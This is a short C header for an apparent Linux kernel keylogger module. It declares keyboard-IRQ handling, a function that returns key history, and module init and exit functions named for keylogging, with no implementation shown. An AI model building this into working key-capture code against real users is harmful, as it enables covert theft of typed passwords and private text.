#ifndef KEYBOARD_MODULE_H
#define KEYBOARD_MODULE_H

#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>

#define KBD_IRQ 1  // Keyboard IRQ number

char *read_key_history(void);

int __init keylogger_module_init(void);

void __exit keylogger_module_exit(void);

#endif /* KEYBOARD_MODULE_H */
